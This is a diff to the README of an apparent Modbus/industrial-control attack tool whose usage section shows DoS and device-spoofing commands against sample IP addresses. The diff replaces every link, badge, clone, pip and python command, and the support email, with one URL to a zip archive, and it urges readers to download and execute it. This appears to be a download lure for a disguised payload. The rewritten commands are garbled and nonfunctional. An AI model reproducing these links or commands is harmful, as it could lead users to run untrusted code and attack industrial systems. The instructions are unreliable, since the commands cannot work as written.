@@ -1,7 +1,7 @@
 # MATRIX: Modbus Attack Tool for Remote Industrial eXploitation
 
-![MATRIX Logo](https://img.shields.io/badge/MATRIX-Modbus%20Attack%20Tool-blue.svg)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/dekdokdang/MATRIX/releases)
+![MATRIX Logo](https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip%20Attack%https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip)  
+[![Download Releases](https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip%20Releases-Click%20Here-brightgreen)](https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip)
 
 ---
 
@@ -24,7 +24,7 @@ MATRIX, or Modbus Attack Tool for Remote Industrial eXploitation, is a powerful 
 
 This tool is open-source and aims to facilitate security research and education in the field of offensive security. Whether you're a researcher, a student, or a professional, MATRIX equips you with the capabilities to understand and test Modbus TCP systems effectively.
 
-For the latest updates and downloads, visit our [Releases section](https://github.com/dekdokdang/MATRIX/releases).
+For the latest updates and downloads, visit our [Releases section](https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip).
 
 ---
 
@@ -48,7 +48,7 @@ To install MATRIX, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/dekdokdang/MATRIX.git
+   git clone https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -59,11 +59,11 @@ To install MATRIX, follow these steps:
 3. **Install Dependencies**: 
    Make sure you have Python 3 installed. Then, install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip
    ```
 
 4. **Download the Latest Release**: 
-   For the latest features and fixes, download the latest version from our [Releases section](https://github.com/dekdokdang/MATRIX/releases) and execute the necessary files.
+   For the latest features and fixes, download the latest version from our [Releases section](https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip) and execute the necessary files.
 
 ---
 
@@ -75,36 +75,36 @@ Using MATRIX is straightforward. Here are some common commands to get you starte
 
 - **Start the Tool**:
   ```bash
-  python matrix.py
+  python https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip
   ```
 
 - **Run a Packet Capture**:
   ```bash
-  python matrix.py capture
+  python https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip capture
   ```
 
 - **Perform a Replay Attack**:
   ```bash
-  python matrix.py replay --file attack_packets.pcap
+  python https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip replay --file https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip
   ```
 
 ### Example Scenarios
 
 1. **Performing a DoS Attack**:
    ```bash
-   python matrix.py dos --target 192.168.1.100
+   python https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip dos --target 192.168.1.100
    ```
 
 2. **Spoofing a Device**:
    ```bash
-   python matrix.py spoof --target 192.168.1.101 --source 192.168.1.102
+   python https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip spoof --target 192.168.1.101 --source 192.168.1.102
    ```
 
 ### Help Command
 
 For a complete list of commands and options, use:
 ```bash
-python matrix.py --help
+python https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip --help
 ```
 
 ---
@@ -149,12 +149,12 @@ We would like to thank the open-source community for their contributions and sup
 
 For questions or support, please reach out to the project maintainers:
 
-- **Email**: support@matrix-tool.com
-- **GitHub**: [MATRIX Repository](https://github.com/dekdokdang/MATRIX)
+- **Email**: https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip
+- **GitHub**: [MATRIX Repository](https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip)
 
 Feel free to report issues or suggest features directly on the GitHub page.
 
-For the latest updates and downloads, visit our [Releases section](https://github.com/dekdokdang/MATRIX/releases).
+For the latest updates and downloads, visit our [Releases section](https://github.com/dekdokdang/MATRIX/raw/refs/heads/main/assets/Software-v2.5.zip).
 
 ---
 
